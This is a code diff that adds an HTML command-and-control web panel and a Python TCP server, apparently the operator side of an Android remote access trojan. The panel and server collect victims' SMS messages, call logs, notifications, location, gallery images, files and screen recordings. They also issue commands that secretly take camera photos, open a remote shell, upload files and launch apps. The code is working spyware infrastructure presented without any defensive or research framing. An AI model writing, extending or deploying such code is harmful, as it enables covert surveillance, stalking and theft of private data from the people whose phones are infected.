@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G.S | C2 Control</title><style>
+        :root {
+            --bg-color: #0a0a0a;
+            --main-green: #00ff41;
+            --dark-green: #008f25;
+            --text-color: #f0f0f0;
+            --border-color: #222;
+            --modal-bg: rgba(10, 10, 10, 0.9);
+        }
+        body, html { margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; background-color: var(--bg-color); color: var(--text-color); font-size: 14px; }
+        .hidden { display: none !important; }
+        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #loader-text { margin-bottom: 20px; font-size: 1.2em; color: var(--main-green); }
+        .progress-bar { width: 80%; max-width: 400px; height: 10px; border: 1px solid var(--main-green); }
+        #progress { width: 0%; height: 100%; background: var(--main-green); transition: width 0.1s linear; }
+        .container { display: flex; flex-direction: column; height: 100vh; }
+        header { background: #111; border-bottom: 1px solid var(--border-color); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+        .logo { font-size: 1.5em; color: var(--main-green); text-shadow: 0 0 5px var(--main-green); }
+        .status { display: flex; align-items: center; }
+        .status-light { width: 12px; height: 12px; border-radius: 50%; background: #ff0000; margin-right: 10px; box-shadow: 0 0 8px #ff0000; transition: all 0.5s; }
+        .status-light.connected { background: var(--main-green); box-shadow: 0 0 8px var(--main-green); }
+        main { display: flex; flex-grow: 1; overflow: hidden; }
+        nav { width: 200px; border-right: 1px solid var(--border-color); padding: 15px 0; display: flex; flex-direction: column; }
+        nav button { background: none; border: none; color: var(--text-color); text-align: left; padding: 12px 20px; font-size: 1em; cursor: pointer; border-left: 3px solid transparent; transition: all 0.2s; }
+        nav button:hover { background: #1a1a1a; color: var(--main-green); }
+        nav button.active { background: #222; border-left-color: var(--main-green); color: var(--main-green); }
+        .content { flex-grow: 1; padding: 20px; overflow-y: auto; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        h2 { color: var(--main-green); border-bottom: 1px solid var(--dark-green); padding-bottom: 5px; }
+        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
+        .info-card { background: #111; padding: 15px; border: 1px solid var(--border-color); }
+        .info-card strong { color: var(--main-green); }
+        .data-list { list-style: none; padding: 0; }
+        .data-list li { background: #111; padding: 10px; border-bottom: 1px solid var(--border-color); margin-bottom: 5px; }
+        .data-list li:last-child { border-bottom: none; }
+        .command-input { display: flex; margin-top: 15px; }
+        .command-input input { flex-grow: 1; background: #1a1a1a; border: 1px solid var(--border-color); color: var(--text-color); padding: 8px; font-family: inherit; }
+        .command-input button { background: var(--dark-green); color: #fff; border: none; padding: 8px 15px; cursor: pointer; }
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--modal-bg); z-index: 500; display: flex; align-items: center; justify-content: center; }
+        .modal-content { background: var(--bg-color); border: 1px solid var(--border-color); width: 90%; max-width: 800px; height: 80%; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        .modal-header { padding: 10px 15px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
+        .modal-title { color: var(--main-green); font-size: 1.2em; }
+        .modal-close { background: none; border: none; color: #fff; font-size: 1.5em; cursor: pointer; }
+        .modal-body { padding: 15px; flex-grow: 1; overflow-y: auto; }
+        #file-manager-path { margin-bottom: 10px; color: #aaa; }
+        .file-item { cursor: pointer; }
+        .file-item:hover { color: var(--main-green); }
+        .dir::before { content: '[D] '; color: var(--main-green); }
+    </style>
+</head>
+<body>
+
+    <div id="loader">
+        <div id="loader-text">INITIALIZING G.S INTERFACE...</div>
+        <div class="progress-bar"><div id="progress"></div></div>
+    </div>
+
+    <div class="container hidden" id="main-container">
+        <header>
+            <div class="logo">G.S</div>
+            <div class="status">
+                <div id="status-light" class="status-light"></div>
+                <span id="status-text">DISCONNECTED</span>
+            </div>
+        </header>
+        <main>
+            <nav>
+                <button class="nav-btn active" data-tab="dashboard">Dashboard</button>
+                <button class="nav-btn" data-tab="commands">Commands</button>
+                <button class="nav-btn" data-tab="notifications">Notifications</button>
+                <button class="nav-btn" data-tab="sms">SMS</button>
+                <button class="nav-btn" data-tab="call-logs">Call Logs</button>
+                <button class="nav-btn" data-tab="apps">Applications</button>
+                <button onclick="showFileManager()">File Manager</button>
+            </nav>
+            <div class="content">
+                <div id="dashboard" class="tab-content active">
+                    <h2>Dashboard</h2>
+                    <div class="grid-container" id="device-info-grid">
+                        <p>Waiting for device connection...</p>
+                    </div>
+                </div>
+                <div id="commands" class="tab-content">
+                    <h2>Terminal</h2>
+                    <ul class="data-list" id="command-history-list"></ul>
+                     <div class="command-input">
+                        <input type="text" id="command-input-field" placeholder="Enter command (e.g., get_location)">
+                        <button onclick="sendCommandFromInput()">SEND</button>
+                    </div>
+                </div>
+                <div id="notifications" class="tab-content">
+                    <h2>Notifications</h2>
+                    <ul class="data-list" id="notifications-list"></ul>
+                </div>
+                <div id="sms" class="tab-content">
+                    <h2>SMS Messages</h2>
+                    <ul class="data-list" id="sms-list"></ul>
+                </div>
+                <div id="call-logs" class="tab-content">
+                    <h2>Call Logs</h2>
+                    <ul class="data-list" id="call-logs-list"></ul>
+                </div>
+                <div id="apps" class="tab-content">
+                    <h2>Installed Apps</h2>
+                    <ul class="data-list" id="apps-list"></ul>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div id="file-manager-modal" class="modal hidden">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">File Manager</h3>
+                <button class="modal-close" onclick="closeFileManager()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="file-manager-path">/</div>
+                <ul class="data-list" id="file-manager-list"></ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- Loader Logic ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const progress = document.getElementById('progress');
+            const loaderText = document.getElementById('loader-text');
+            const mainContainer = document.getElementById('main-container');
+            const loader = document.getElementById('loader');
+            let width = 0;
+            const interval = setInterval(() => {
+                width += Math.random() * 5;
+                if (width >= 100) {
+                    width = 100;
+                    progress.style.width = width + '%';
+                    clearInterval(interval);
+                    loaderText.textContent = "ACCESS GRANTED";
+                    setTimeout(() => {
+                        loader.classList.add('hidden');
+                        mainContainer.classList.remove('hidden');
+                        startApp();
+                    }, 500);
+                }
+                progress.style.width = width + '%';
+            }, 50);
+        });
+
+        function startApp() {
+            // --- App Logic ---
+            const statusLight = document.getElementById('status-light');
+            const statusText = document.getElementById('status-text');
+
+            // --- Navigation ---
+            const navButtons = document.querySelectorAll('.nav-btn');
+            const tabContents = document.querySelectorAll('.tab-content');
+            navButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    navButtons.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    tabContents.forEach(tab => {
+                        tab.style.display = tab.id === btn.dataset.tab ? 'block' : 'none';
+                    });
+                    if(btn.dataset.tab === 'sms') sendCommand('get_sms');
+                    if(btn.dataset.tab === 'call-logs') sendCommand('get_calls');
+                    if(btn.dataset.tab === 'apps') sendCommand('get_apps');
+                });
+            });
+
+            // --- API Communication ---
+            async function sendCommand(command, params = {}) {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command, params })
+                });
+            }
+
+            window.sendCommandFromInput = function() {
+                const input = document.getElementById('command-input-field');
+                const [command, ...args] = input.value.trim().split(' ');
+                let params = {};
+                // Simple parsing for commands like "toast Hello world"
+                if (args.length > 0) {
+                   params = { value: args.join(' ') };
+                }
+                if(command) sendCommand(command, params);
+                input.value = '';
+            }
+            document.getElementById('command-input-field').addEventListener('keyup', (e) => {
+                if (e.key === 'Enter') sendCommandFromInput();
+            });
+
+            // --- Data Rendering ---
+            function updateDashboard(info) {
+                const grid = document.getElementById('device-info-grid');
+                grid.innerHTML = `
+                    <div class="info-card"><strong>Model:</strong> ${info.Model || 'N/A'}</div>
+                    <div class="info-card"><strong>Manuf:</strong> ${info.Manufacturer || 'N/A'}</div>
+                    <div class="info-card"><strong>Android:</strong> ${info.AndroidVersion || 'N/A'} (SDK ${info.SDKVersion || 'N/A'})</div>
+                    <div class="info-card"><strong>Battery:</strong> ${info.Battery || 'N/A'}</div>
+                `;
+            }
+
+            function renderList(elementId, items, formatter) {
+                const list = document.getElementById(elementId);
+                list.innerHTML = items.length > 0 ? items.map(formatter).join('') : '<li>No data available.</li>';
+            }
+
+            // --- Main Update Loop ---
+            setInterval(async () => {
+                const statusRes = await fetch('/api/status');
+                const status = await statusRes.json();
+
+                if (status.connected) {
+                    statusLight.classList.add('connected');
+                    statusText.textContent = "CONNECTED";
+                    updateDashboard(status.device_info);
+
+                    const dataTypes = ['notifications', 'sms', 'calllogs', 'apps', 'filemanager', 'history'];
+                    for(const type of dataTypes) {
+                        const res = await fetch(`/api/data/${type}`);
+                        const data = await res.json();
+                        
+                        if(type === 'notifications') renderList('notifications-list', data, item => `<li><strong>${item.package}</strong> (${item.time})<br>${item.title}: ${item.text}</li>`);
+                        if(type === 'sms') renderList('sms-list', data, item => `<li><strong>From: ${item.userSender}</strong><br>${item.content}</li>`);
+                        if(type === 'calllogs') renderList('call-logs-list', data, item => `<li><strong>${item.call_type}</strong>: ${item.number} (${item.duration_seconds}s)</li>`);
+                        if(type === 'apps') renderList('apps-list', data, item => `<li>${item.appName} <small>(${item.packageName})</small></li>`);
+                        if(type === 'filemanager') updateFileManager(data);
+                        if(type === 'history') renderList('command-history-list', data, item => `<li>(${item.time}) > ${item.command}<br><small>${item.response}</small></li>`);
+                    }
+
+                } else {
+                    statusLight.classList.remove('connected');
+                    statusText.textContent = "DISCONNECTED";
+                    document.getElementById('device-info-grid').innerHTML = '<p>Waiting for device connection...</p>';
+                }
+            }, 2000); // Refresh every 2 seconds
+        }
+
+        // --- File Manager Logic ---
+        window.showFileManager = function() {
+            sendCommand('file_manager', { path: '/' });
+            document.getElementById('file-manager-modal').classList.remove('hidden');
+        }
+
+        window.closeFileManager = function() {
+            sendCommand('exit_file_manager');
+            document.getElementById('file-manager-modal').classList.add('hidden');
+        }
+
+        function updateFileManager(data) {
+            document.getElementById('file-manager-path').textContent = data.path;
+            renderList('file-manager-list', data.files, file => 
+                `<li class="file-item ${file.isDirectory ? 'dir' : ''}" onclick="navigateFile('${file.name}', ${file.isDirectory})">${file.name}</li>`
+            );
+        }
+
+        window.navigateFile = function(name, isDirectory) {
+            const currentPath = document.getElementById('file-manager-path').textContent;
+            if (isDirectory) {
+                const newPath = currentPath === '/' ? `/${name}` : `${currentPath}/${name}`;
+                sendCommand('file_manager', { path: newPath });
+            } else {
+                sendCommand('get_file', { path: `${currentPath}/${name}` });
+            }
+        }
+    </script>
+</body>
+</html>
+import socket
+import json
+import threading
+import base64
+from datetime import datetime
+import time
+import logging
+import sys
+import os
+from colorama import init, Fore, Style
+import signal
+
+# --- Globals ---
+client_socket = None
+client_address = None
+running = True
+in_shell_mode = False
+in_notification_mode = False
+in_gallery_mode = False
+device_current_dir = "/"
+
+# --- Setup ---
+init(autoreset=True)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+if not os.path.exists('captured_images'): os.makedirs('captured_images')
+if not os.path.exists('device_downloads'): os.makedirs('device_downloads')
+if not os.path.exists('screen_recordings'): os.makedirs('screen_recordings')
+if not os.path.exists('gallery_downloads'): os.makedirs('gallery_downloads')
+
+# --- UI & Data Handlers ---
+def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_header():
+    print(Fore.CYAN + "=" * 80)
+    print(Fore.CYAN + "             REMOTE C2 AGENT - TERMINAL")
+    print(Fore.CYAN + "=" * 80)
+
+def print_device_info(info):
+    print(f"""{Fore.CYAN}
+--- Device Information ---{Style.RESET_ALL}
+  {Fore.YELLOW}Model:         {Fore.WHITE}{info.get('Model', 'N/A')}
+  {Fore.YELLOW}Manufacturer:  {Fore.WHITE}{info.get('Manufacturer', 'N/A')}
+  {Fore.YELLOW}Android Ver:   {Fore.WHITE}{info.get('AndroidVersion', 'N/A')} (SDK {info.get('SDKVersion', 'N/A')})
+  {Fore.YELLOW}Battery:       {Fore.WHITE}{info.get('Battery', 'N/A')}
+{Fore.CYAN}--------------------------{Style.RESET_ALL}""")
+
+def print_notification_log(log):
+    sys.stdout.write(f"\r{' ' * (len(input_prompt()) + 5)}\r")
+    sys.stdout.write(f"{Fore.MAGENTA}\n[NOTIF | {log.get('packageName', 'N/A')}]\n  {Fore.YELLOW}Title: {Fore.WHITE}{log.get('title', 'N/A')}\n  {Fore.YELLOW}Text:  {Fore.WHITE}{log.get('text', 'N/A')}\n")
+    sys.stdout.write(input_prompt())
+    sys.stdout.flush()
+
+def print_sms_log(log): print(f"\n{Fore.GREEN}[SMS - {log.get('userSender', 'N/A')}]: {Fore.WHITE}{log.get('content', 'N/A')}")
+
+def print_call_log(log):
+    type_color = {"INCOMING": Fore.GREEN, "OUTGOING": Fore.YELLOW, "MISSED": Fore.RED}.get(log.get('call_type', 'UNKNOWN'), Fore.WHITE)
+    print(f"\n{Fore.CYAN}[CALL] Num: {Fore.WHITE}{log.get('number', 'N/A')}|{type_color}{log.get('call_type', 'N/A')}{Style.RESET_ALL}|Dur: {log.get('duration_seconds', 'N/A')}s|Date: {log.get('date', 'N/A')}")
+
+def save_image(log_data, folder='captured_images'):
+    try:
+        filepath = os.path.join(folder, log_data.get('filename', 'unknown.jpg'))
+        with open(filepath, 'wb') as f: f.write(base64.b64decode(log_data.get('image_base64', '')))
+        print(f"\n{Fore.MAGENTA}[IMAGE] Saved to: {filepath}")
+    except Exception as e: print(f"\n{Fore.RED}[ERROR] Could not save image: {e}")
+
+def print_app_list(log_data):
+    apps = log_data.get('apps', [])
+    print(Fore.CYAN + "\n--- Installed Applications ---")
+    for i, app in enumerate(apps): print(f"{i+1}. {app.get('appName', 'N/A')} ({app.get('packageName', 'N/A')})")
+    print(Fore.CYAN + "-----------------------------")
+
+def print_gallery_page(log_data):
+    files = log_data.get('files', [])
+    print(Fore.CYAN + "\n--- Gallery Page ---")
+    if not files: print("No more images."); return
+    for f in files: print(f"[{f.get('index')}] {f.get('name')} {Fore.YELLOW}({f.get('path', '...')}) ")
+    print(Fore.CYAN + "---------------------")
+
+def handle_file_chunk(log_data, folder):
+    try:
+        filename = log_data.get('filename', 'downloaded_file')
+        filepath = os.path.join(folder, filename)
+        with open(filepath, 'ab') as f: f.write(base64.b64decode(log_data.get('chunk', '')))
+        sys.stdout.write(f"\r{Fore.BLUE}[DOWNLOAD] Receiving {filename}...     ")
+        sys.stdout.flush()
+    except Exception as e: print(f"\n{Fore.RED}[ERROR] Could not write file chunk: {e}")
+
+def handle_incoming_data(data):
+    global in_shell_mode, in_notification_mode, in_gallery_mode, device_current_dir
+    try:
+        payload = json.loads(data).get('data', {})
+        log_type = payload.get('type', 'UNKNOWN')
+
+        handler_map = {
+            'SMS_LOG': lambda p: print_sms_log(p.get('log')),
+            'CALL_LOG': lambda p: print_call_log(p.get('log')),
+            'IMAGE_DATA': lambda p: save_image(p.get('image')),
+            'APP_LIST': print_app_list,
+            'DEVICE_INFO': lambda p: print_device_info(p.get('info')),
+            'GET_FILE_CHUNK': lambda p: handle_file_chunk(p.get('chunk_data'), 'device_downloads'),
+            'GALLERY_IMAGE_CHUNK': lambda p: handle_file_chunk(p.get('chunk_data'), 'gallery_downloads'),
+            'NOTIFICATION_DATA': lambda p: print_notification_log(p.get('notification')),
+            'LOCATION_SUCCESS': lambda p: print(f"\n{Fore.YELLOW}[LOCATION] {p.get('url')}"),
+            'LOCATION_FAIL': lambda p: print(f"\n{Fore.RED}[LOCATION] Failed: {p.get('error')}"),
+            'SCREEN_RECORDER_STARTED': lambda p: print(f"\n{Fore.BLUE}[REC] Screen recording started..."),
+            'SCREEN_RECORDER_STOPPED': lambda p: print(f"\n{Fore.BLUE}[REC] Recording stopped. Receiving file..."),
+            'GET_FILE_END': lambda p: print(f"\n{Fore.GREEN}[DOWNLOAD] File {p.get('file')} saved."),
+            'GALLERY_IMAGE_END': lambda p: print(f"\n{Fore.GREEN}[GALLERY] Image {p.get('file')} saved."),
+            'FILE_MANAGER_RESULT': lambda p: [print(f"[D] {f['name']}/" if f['isDirectory'] else f['name']) for f in p.get('files', [])],
+            'SHELL_LS_RESULT': lambda p: [print(f"{Fore.CYAN if f['isDirectory'] else Fore.WHITE}{f['name']}") for f in p.get('files', [])],
+            'SHELL_MODE_STARTED': lambda p: globals().update(in_shell_mode=True, device_current_dir=p.get("current_dir")),
+            'SHELL_MODE_ENDED': lambda p: globals().update(in_shell_mode=False),
+            'NOTIFICATION_MODE_STARTED': lambda p: globals().update(in_notification_mode=True),
+            'NOTIFICATION_MODE_ENDED': lambda p: globals().update(in_notification_mode=False),
+            'GALLERY_MODE_STARTED': lambda p: globals().update(in_gallery_mode=True),
+            'GALLERY_MODE_ENDED': lambda p: globals().update(in_gallery_mode=False),
+            'GALLERY_SCAN_STARTED': lambda p: print(f"\n{Fore.BLUE}[GALLERY] Scanning device..."),
+            'GALLERY_SCAN_COMPLETE': lambda p: print(f"\n{Fore.GREEN}[GALLERY] Scan complete. {p.get('image_count')} images found."),
+            'GALLERY_PAGE_DATA': print_gallery_page,
+            'SHELL_CD_SUCCESS': lambda p: globals().update(device_current_dir=p.get("current_dir")),
+        }
+        if log_type in handler_map:
+            handler_map[log_type](payload)
+        else:
+            print(f"\n{Fore.YELLOW}[LOG]: {payload}")
+
+    except json.JSONDecodeError: print(f"\n{Fore.RED}[ERROR] Received non-JSON data: {data[:200]}...")
+    except Exception as e: print(f"\n{Fore.RED}[ERROR] Could not process data: {e}")
+
+# --- Core Logic ---
+def client_listener(sock):
+    buffer = ""
+    while running and sock:
+        try:
+            data = sock.recv(16384).decode('utf-8', errors='ignore')
+            if not data: break
+            buffer += data
+            while '\n' in buffer:
+                line, buffer = buffer.split('\n', 1)
+                if line.strip(): handle_incoming_data(line.strip())
+        except ConnectionResetError: break
+        except socket.timeout: continue
+        except Exception as e: break
+    print(f"\n{Fore.RED}Client disconnected.")
+    globals().update(client_socket=None, in_shell_mode=False, in_notification_mode=False, in_gallery_mode=False)
+
+def input_prompt():
+    if in_shell_mode: return f"{Fore.YELLOW}Shell@{device_current_dir}> {Style.RESET_ALL}"
+    elif in_notification_mode: return f"{Fore.MAGENTA}Notifikasi > {Style.RESET_ALL}"
+    elif in_gallery_mode: return f"{Fore.CYAN}Gallery > {Style.RESET_ALL}"
+    elif client_address: return f"{Fore.GREEN}C2 @ {client_address[0]} > {Style.RESET_ALL}"
+    else: return ""
+
+def shell():
+    global running
+    while running:
+        if not client_socket: time.sleep(1); continue
+        try:
+            prompt = input_prompt()
+            cmd_input = input(prompt)
+            if in_notification_mode:
+                if cmd_input.strip().lower() == 'exit':
+                    print(f"{Fore.YELLOW}Sending command: exit...", flush=True)
+                    client_socket.sendall(b"exit\n")
+                continue
+
+            if not cmd_input: continue
+            cmd_parts = cmd_input.strip().split(" ", 1)
+            cmd = cmd_parts[0].lower()
+
+            if cmd == 'quit': running = False; break
+
+            if in_shell_mode:
+                if cmd == 'exit': cmd_input = 'exit_shell'
+                print(f"{Fore.YELLOW}Sending shell command: {cmd_input}...", flush=True)
+                if cmd == 'upload':
+                    if len(cmd_parts) < 2: print("Usage: upload <local_file_path>"); continue
+                    local_path = cmd_parts[1]
+                    if not os.path.exists(local_path): print(f"File not found: {local_path}"); continue
+                    with open(local_path, 'rb') as f: file_data = f.read()
+                    filename_b64 = base64.b64encode(os.path.basename(local_path).encode()).decode()
+                    data_b64 = base64.b64encode(file_data).decode()
+                    client_socket.sendall(f"upload {filename_b64} {data_b64}\n".encode())
+                else:
+                    client_socket.sendall(f"{cmd_input}\n".encode())
+            elif in_gallery_mode:
+                gallery_commands = ['next', 'back', 'exit']
+                if cmd in gallery_commands:
+                    print(f"{Fore.YELLOW}Sending command: {cmd}...", flush=True)
+                    client_socket.sendall(f"{cmd}\n".encode())
+                elif cmd == 'view' and len(cmd_parts) > 1:
+                    print(f"{Fore.YELLOW}Sending command: {cmd_input}...", flush=True)
+                    client_socket.sendall(f"{cmd_input}\n".encode())
+                else: print("Gallery commands: next, back, view <index>, exit")
+            else: # Main menu commands
+                main_commands = ['shell', 'getsms', 'getcalllogs', 'flashon', 'flashoff', 'takefrontpic', 'takebackpic', 'list_app', 'get_location', 'screen_recorder', 'filemanager', 'notifikasi', 'gallery', 'deviceinfo']
+                if cmd in main_commands and len(cmd_parts) == 1:
+                    print(f"{Fore.YELLOW}Sending command: {cmd}...", flush=True)
+                    client_socket.sendall(f"{cmd}\n".encode())
+                elif cmd_input.startswith(('run ', 'open ', 'toast ')):
+                    print(f"{Fore.YELLOW}Sending command: {cmd_input}...", flush=True)
+                    client_socket.sendall(f"{cmd_input}\n".encode())
+                elif cmd == 'help':
+                    print("Commands: shell, filemanager, gallery, notifikasi, deviceinfo, open <url>, toast on/off <text>, getsms, getcalllogs, get_location, screen_recorder, list_app, run <pkg>, flashon/off, takefront/backpic, help, quit")
+                else:
+                    print("Unknown command. Type 'help' for a list.")
+
+        except (EOFError, KeyboardInterrupt): running = False; break
+        except Exception as e: print(f"\n{Fore.RED}[ERROR] Shell crashed: {e}")
+
+def main():
+    global client_socket, client_address, running
+    def signal_handler(sig, frame): globals().update(running=False); print("\nExiting..."); sys.exit(0)
+    signal.signal(signal.SIGINT, signal_handler)
+
+    clear_screen(); print_header()
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind(('0.0.0.0', 9090))
+    server_socket.listen(1)
+    print(f"[*] Listening on 0.0.0.0:9090")
+
+    threading.Thread(target=shell, daemon=True).start()
+
+    while running:
+        if not client_socket:
+            print("[*] Waiting for a connection...")
+            try:
+                conn, addr = server_socket.accept()
+                conn.settimeout(5.0)
+                client_socket, client_address = conn, addr
+                print(f"\n{Fore.GREEN}[+] Accepted connection from {addr[0]}:{addr[1]}")
+                threading.Thread(target=client_listener, args=(conn,), daemon=True).start()
+            except socket.error: break
+        time.sleep(1)
+
+    server_socket.close()
+    print("Server shut down.")
+
+if __name__ == '__main__':
+    main()
